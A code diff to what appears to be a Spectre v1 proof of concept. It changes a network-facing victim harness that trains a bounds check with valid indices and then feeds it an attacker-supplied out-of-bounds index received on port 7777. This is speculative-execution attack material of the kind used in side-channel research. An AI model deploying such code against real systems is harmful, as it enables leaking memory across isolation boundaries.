@@ -222,6 +222,8 @@ void helper(size_t malicious_x, size_t training_x = 0) {
     x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
     x = training_x ^ (x & (malicious_x ^ training_x));
 
+//    auto x = ((j % 6) == 0) ? malicious_x : training_x;
+
     /* Call the victim function! */
     victim_function(x);
   }
@@ -243,19 +245,25 @@ void recv_worker(uint16_t port = 7777) {
   for (;;) {
     auto bytes = s.recv(buf, sizeof(buf));
     if (bytes == sizeof(msg)) {
-      msg* m = (msg*)buf;
-      auto x = m->x;
-      m->x = tries;
+      msg& m = reinterpret_cast<msg&>(buf);
+      auto x = m.x;
 
 #ifdef DEBUG
       std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
       std::cout << "x=" << x << std::endl;
 #endif
 
+      // Target malicious_x:
+      auto malicious_x = x;
+
+      // Pick a valid training_x:
+      // - Note: we will be blind to the cache line at this training_x...
       size_t training_x = (tries++ * 13) % ARRAY1_LEN;
-      size_t malicious_x = x;
+      m.x = training_x;   // let attacker know the training_x used...
+
+      // Train victom_function training_x, then poke with malicious_x:
       helper(malicious_x, training_x);
-      s.send(m, sizeof(*m));
+      s.send(&m, sizeof(m));
     }
     else {
       std::cerr << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
